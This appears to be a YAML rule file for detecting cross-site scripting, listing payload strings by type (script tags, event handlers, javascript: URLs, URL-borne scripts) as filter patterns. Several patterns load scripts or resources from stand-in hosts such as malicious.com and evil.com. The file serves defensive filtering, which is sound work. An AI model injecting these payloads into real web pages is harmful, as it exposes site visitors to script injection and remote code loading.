# Updated XSS Detection Rules
# Strengthen detection of XSS payloads and update filter rules
xss_detection_rules:
  - name: "Basic XSS Payloads"
    patterns:
      - "<script>alert('XSS')</script>"
      - "<img src=x onerror=alert('XSS')>"
      - "<svg><script>alert('XSS')</script></svg>"
      - "<script>document.write('<img src=x onerror=alert(1)>')</script>"
      - "<svg/onload=alert('XSS')>"
      - "<script src='http://malicious.com/xss.js'></script>"
      - "<iframe src='javascript:alert(1)'></iframe>"
      - "<script>fetch('http://malicious.com');</script>"  # New pattern
      - "<link rel='stylesheet' href='http://malicious.com/styles.css'>"  # New pattern

  - name: "Attribute-Based XSS"
    patterns:
      - "<a href=javascript:alert('XSS')>Click me</a>"
      - "<input onfocus=alert('XSS') autofocus>"
      - "<div data-attribute='onclick:alert(1)'>Test</div>"  # New pattern

  - name: "Event Handler XSS"
    patterns:
      - "<body onload=alert('XSS')>"
      - "<div onclick=alert('XSS')>Click here!</div>"
      - "<span onmouseover='alert(1)'>Hover over me</span>"  # New pattern
      - "<button onmousedown='alert(1)'>Press me</button>"  # New pattern

  - name: "URL-Based XSS"
    patterns:
      - "http://evil.com?param=<script>alert('XSS')</script>"
      - "http://example.com/#<script>alert('XSS')</script>"
      - "https://example.com/path?query=<script>alert(1)</script>"  # New pattern

  - name: "HTML Injection"
    patterns:
      - "<!--<script>alert('XSS')</script>-->"
      - "<style>@import 'http://malicious.com';</style>"  # New pattern

# Ensure that the above patterns are applied across all request types
apply_to:
  - GET
  - POST
  - PUT
  - DELETE
